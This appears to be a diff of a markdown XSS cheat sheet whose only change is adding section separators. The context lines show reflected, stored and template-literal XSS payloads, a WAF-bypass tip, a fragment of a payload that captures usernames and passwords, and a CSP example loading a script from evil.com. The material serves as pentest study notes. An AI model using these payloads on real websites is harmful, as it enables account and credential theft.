@@ -47,6 +47,8 @@ Additionally, if the target sanitizes your payload using a library like DOMPurif
 
 {{< /hint >}}
 
+---
+
 ## Reflected XSS
 
 The malicious script comes from the current HTTP request.
@@ -55,6 +57,8 @@ The malicious script comes from the current HTTP request.
 https://insecure-website.com/search?term=<script>alert(document.domain)</script>
 ```
 
+---
+
 ## Stored XSS
 
 The malicious script comes from the website's database. POST body example:&#x20;
@@ -62,6 +66,8 @@ The malicious script comes from the website's database. POST body example:&#x20;
 ```sh
 comment=<script>alert(document.domain)</script>
 ```
+
+---
 
 ## DOM-based XSS
 
@@ -220,6 +226,8 @@ eval('var data = "reflected string"');
 element.innerHTML = comment.author
 ```
 
+---
+
 ## XSS contexts
 
 ### Between HTML tags
@@ -336,9 +344,13 @@ var input = `controllable data here`;
 ${alert(document.domain)}
 ```
 
+---
+
 ## Bypass WAF
 
 If you receive an error like "tag is not allowed" or "event is not allowed", use XSS cheat sheet ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) to discover a tag and event that work.
+
+---
 
 ## Exploitation
 
@@ -382,6 +394,8 @@ body:username.value+':'+this.value
 * When CSRF occurs as a standalone vulnerability, it can be patched using strategies like anti-CSRF tokens. However, these strategies do not provide any protection if an XSS vulnerability is also present.
 * If the site use a token you can get it doing a first request and then add the token in a second request
 
+---
+
 ## Content security policy
 
 CSP restrict the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages. CSP defends against XSS attacks in the following ways
@@ -392,6 +406,8 @@ CSP restrict the resources (such as scripts and images) that a page can load and
   * `<script src="https://evil.com/hacked.js"></script>` will not work
 * Restricting Unsafe JavaScript
 * Others [https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
+
+---
 
 ## Compress & minify JavaScript
 
